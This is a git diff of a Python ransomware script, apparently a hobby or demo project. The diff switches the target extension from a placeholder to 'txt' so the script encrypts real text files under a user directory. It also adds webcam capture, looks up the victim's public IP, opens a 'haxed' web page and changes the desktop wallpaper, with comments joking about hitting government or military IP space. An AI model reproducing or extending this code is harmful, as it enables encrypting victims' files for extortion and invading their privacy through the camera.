@@ -7,21 +7,22 @@ import ctypes
 import encryptor
 import threading
 import tkinter as tk
-
+import cv2
+import signal
+import time
 
 # File exstensions to seek out and Encrypt
 """
     CAUTION: start with something crazy like bananas
 """
 extensions = [
-    'bananas',
+    "txt",
 ]
+
 
 class RansomWare:
 
     def __init__(self):
-        self.encryptor = encryptor
-
         self.public_key = None
 
         ''' Root directorys to start Encryption/Decryption from
@@ -29,21 +30,25 @@ class RansomWare:
             CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
         '''
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
-        self.sysRoot = os.path.expanduser('~/test')
+        self.attemps = 0
+        self.sysRoot = os.path.expanduser('~\\test')
 
         self.system_encrypted = self.check_encrypted()
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
+        print(f"[IP ADDRESS] {self.publicIP}")
+        print(f"[SYS ROOT] {self.sysRoot}")
         self.start_attack()
 
     def start_attack(self):
         try:
-            self.change_desktop_background()
             self.open_browser()
+            self.change_desktop_background()
             self.encryptSystem()
-        except Exception as err:
-            print(err)
+            self.take_picture()
+        except Exception as error:
+            print(error)
 
     def change_desktop_background(self):
         imageUrl = 'https://atlasworlds.blob.core.windows.net/media/joverall22__QGdtYWlsLmNvbQ==/1e09dad7-c74a-4d85-89d0-82c342c50ed7.png'
@@ -56,12 +61,36 @@ class RansomWare:
             SPI_SETDESKWALLPAPER, 0, path, 0)
 
     def open_browser(self):
-        webbrowser.open('http://net-informations.com', new=1)
+        webbrowser.open('https://jakeoverall.github.io/haxed', new=1)
 
     def encryptSystem(self):
         if not self.system_encrypted:
-            self.encryptor.encryptDirectory(self.sysRoot, extensions)
-            open(".encrypted", "wb").write("HAXED")
+            encryptor.encryptDirectory(self.sysRoot, extensions)
+            open(".encrypted", "wb").write("HAXED".encode())
+        else:
+            encryptor.decryptDirectory(self.sysRoot, extensions)
+            os.remove(".encrypted")
+
+    def take_picture(self):
+
+        try:
+            self.attemps += 1
+            vid = cv2.VideoCapture(1)
+            while self.attemps < 5:
+                ret, frame = vid.read()
+                cv2.imshow('frame', frame)
+                if cv2.waitKey(1) & 0xFF == ord('q'):
+                    break
+
+            vid.release()
+            cv2.destroyAllWindows()
+            
+            if self.attemps < 5:
+                time.sleep(2)
+                self.take_picture()
+                
+        except Exception as err:
+            print(err)
 
     def check_encrypted(self):
         """
@@ -75,8 +104,21 @@ class RansomWare:
 
 
 def main():
-    RansomWare()
+    try:
+        RansomWare()
+    except Exception as err:
+        print(err)
+
+
+def quit():
+    print(" Okay, Bye 👋 ")
+    exit(0)
+
+
+def signal_handler(signal, frame):
+    quit()
 
 
 if __name__ == '__main__':
+    signal.signal(signal.SIGINT, signal_handler)
     main()
